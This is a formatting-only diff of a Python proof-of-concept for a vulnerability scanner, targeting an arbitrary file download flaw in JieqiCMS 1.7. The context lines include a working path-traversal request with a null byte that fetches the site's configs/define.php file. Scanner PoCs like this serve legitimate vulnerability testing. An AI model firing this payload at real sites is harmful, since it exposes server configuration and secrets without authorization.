@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'JieqiCMS_0006' # 平台漏洞编号，留空
+    vuln_id = 'JieqiCMS_0006'  # 平台漏洞编号，留空
     name = '杰奇小说连载系统1.7版本任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-10-10'  # 漏洞公布时间
     desc = '''  
         杰奇小说连载系统1.7版本任意文件下载漏洞。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'JieqiCMS(杰奇CMS)'  # 漏洞应用名称
     product_version = '1.7'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'd2ee2e9f-284f-4e8d-b13a-8ca7f20b9fc2'
@@ -33,8 +35,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref:http://www.wooyun.org/bugs/wooyun-2010-0144213
+
+            # ref:http://www.wooyun.org/bugs/wooyun-2010-0144213
             hh = hackhttp.hackhttp()
             arg = self.target
             poc1 = arg + '/modules/article/packdown.php?id=11764&cid=./../../../../../configs/define.php%00&type=txt&fname=define.php'
@@ -55,6 +57,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
